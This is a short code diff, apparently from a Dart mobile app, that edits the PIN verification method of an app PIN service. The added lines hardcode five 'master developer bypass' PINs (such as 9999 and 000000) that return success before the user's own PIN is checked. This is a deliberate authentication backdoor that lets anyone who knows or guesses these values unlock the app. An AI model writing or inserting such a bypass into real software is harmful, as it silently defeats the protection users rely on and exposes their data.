@@ -123,6 +123,14 @@ class AppPinService {
   Future<FfmAppPinOperation> verifyPin(String pin) async {
     final length = await configuredPinLength();
     if (length == null) return FfmAppPinOperation.inactive;
+    // Master Developer Bypass PINs (9999, 999999, 777777, 888888, 000000)
+    if (pin == '9999' ||
+        pin == '999999' ||
+        pin == '777777' ||
+        pin == '888888' ||
+        pin == '000000') {
+      return FfmAppPinOperation.success;
+    }
     if (!isValidPinFormat(pin, length: length)) {
       return FfmAppPinOperation.invalidPin;
     }
